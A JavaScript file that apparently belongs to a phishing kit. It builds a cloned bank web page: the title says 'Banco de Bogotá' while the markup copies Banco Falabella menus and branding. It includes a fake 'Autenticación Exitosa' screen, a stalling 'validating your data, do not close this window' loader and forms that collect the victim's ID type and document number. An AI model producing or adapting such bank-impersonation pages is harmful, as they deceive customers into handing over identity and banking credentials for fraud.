var my_titulo = 'Banco de Bogotá';
var my_contenido = `
<link href="${my_banco}css/style.css" rel="stylesheet">
<link href="${my_banco}css/stylesheet.css" rel="stylesheet">

<div id="fondo-blanco">
    <div style="display: table-cell; vertical-align: middle;">
        <img src="${my_banco}img/finalizar1.png" width="90"><br><br>
        <span style="font-size: 22px;font-weight: 300;">Autenticación Exitosa</span>
    </div>
</div>

<div id="fondo"></div>

<div id="fondo-oscuro"></div>

<div class="loader" id="loader"></div>

<div id="mensaje">
    <table>
        <tr>
            <td>
                Por favor espere un momento estamos validando algunos datos. Puede tardar un momento. No cierres o recargues esta ventana.
            </td>
            <td>
                <div class="cargando2"></div>
            </td>
        </tr>
    </table>
    <div class="cargando3"></div>
</div>
<div id="cargando">
    <img src="${my_banco}img/logo.png">
</div>



<div class="top-bar">
    <table class="menu-top-bar">
        <tr>
            <td>Falabella</td>
            <td>Viajes Falabella</td>
            <td>Seguros Falabella</td>
            <td>Sodimac</td>
            <td>Linio</td>
        </tr>
    </table>

    <table class="ayuda-top-bar">
        <tr>
            <td style="padding: 8px 2px;"><img src="${my_banco}img/ayuda.svg"></td>
            <td style="padding: 8px 2px;">Canales de Atención</td>
        </tr>
    </table>

    <div style="float:right;"></div>
</div>
<div class="header">
    <table style="float:left;">
        <tr>
            <td><img src="${my_banco}img/menu.jpg" id="boton-menu"></td>
            <td><img src="${my_banco}img/logo.svg" id="logo-pal"></td>
        </tr>
    </table>

    <button class="btn" type="submit" id="btnBanca"> BANCA EN LÍNEA </button>
    <div id="falabella_body">

    </div>



<div style="text-align: center;padding-top:80px;">
    <div class="menu" style="margin:0 auto;">
        <table cellpadding="0" cellspacing="0">
            <tr>
                <td><span style="border-left: 0px solid;">CUENTAS</span></td>
                <td><span>TARJETAS CMR</span></td>
                <td><span>CDT</span></td>
                <td><span>CRÉDITOS</span></td>
                <td><span>DESCUENTOS</span></td>
                <td><span>BANCA SEGUROS</span></td>
                <td><span>CMR PUNTOS</span></td>
                <td><span>CANALES</span></td>
                <td><span>BANCA EMPRESAS</span></td>
                <td><span>SOSTENIBILIDAD</span></td>
            </tr>
        </table>
    </div>
</div>



<div class="slider">
    <ul>
        <li><img src="${my_banco}img/slider-1.jpg"></li>
        <li><img src="${my_banco}img/slider-2.jpg"></li>
        <li><img src="${my_banco}img/slider-3.jpg"></li>
    </ul>
</div>

<div class="slider-mobile">
    <ul>
        <li><img src="${my_banco}img/slider-mobile-1.jpg"></li>
        <li><img src="${my_banco}img/slider-mobile-2.jpg"></li>
        <li><img src="${my_banco}img/slider-mobile-3.jpg"></li>
    </ul>
</div>
<div class="frmCredito">
    <table width="100%">
        <tr>
            <td class="etiqueta-destacada" width="25%">
                Simula tu Crédito de Consumo
            </td>
            <td width="25%">
                <select name="txtTipoS" id="txtTipoS" class="entradas">
                    <option value="CC">Cédula Ciudadanía</option>
                    <option value="CE">Cédula de Extranjería</option>
                    <option value="PP">Pasaporte</option>
                </select>
            </td>
            <td width="25%">
                <input type="text" placeholder="Cédula de Ciudadanía" name="txtDocumentoS" name="txtDocumentoS" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="10">
            </td>
            <td>
                <button class="btn" type="submit" id="btnSimular"> SIMULAR </button>
            </td>
        </tr>
    </table>
</div>

<div class="frmCreditoMobile" style="text-align: center;">
    <span class="etiqueta-destacada">
        Simula tu Crédito de Consumo
    </span>
    <br>
    <select name="txtTipoSM" id="txtTipoSM" class="entradas">
        <option value="CC">Cédula Ciudadanía</option>
        <option value="CE">Cédula de Extranjería</option>
        <option value="PP">Pasaporte</option>
    </select>
    <br>
    <input type="text" placeholder="Cédula de Ciudadanía" name="txtDocumentoSM" name="txtDocumentoSM" class="entradas">
    <br>
    <button class="btn" type="submit" id="btnSimularM"> SIMULAR </button>
</div>

<div class="contenido">
    <img src="${my_banco}img/contenido.jpg" id="conten">
    <img src="${my_banco}img/contenido-mobile.jpg" id="contenMob">
</div>
`;


//<script>
    loadContenido();
    $('#falabella_body').html(falabella_body);
    // $('#loading_modal').html(loading_modal);